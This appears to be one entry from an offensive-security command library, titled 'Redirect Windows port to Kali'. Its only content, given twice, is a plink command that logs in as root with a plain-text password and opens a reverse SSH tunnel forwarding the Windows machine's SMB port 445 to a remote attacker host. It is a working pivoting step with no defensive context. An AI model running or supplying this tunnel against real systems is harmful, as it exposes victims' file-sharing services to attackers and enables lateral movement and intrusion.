---
id: aefd8f7d-6b49-4f3a-b5cd-94d75d4e0d34
name: Redirect Windows port to Kali
type: command
executor: bash
data: plink -P 22 -l root -pw some_password -C -R 445:127.0.0.1:445 192.168.12.185
output: null
created_at: '2023-04-06T03:56:23.000111+00:00'
updated_at: '2023-04-10T20:25:11.704574+00:00'
---

# Redirect Windows port to Kali

```bash
plink -P 22 -l root -pw some_password -C -R 445:127.0.0.1:445 192.168.12.185
```


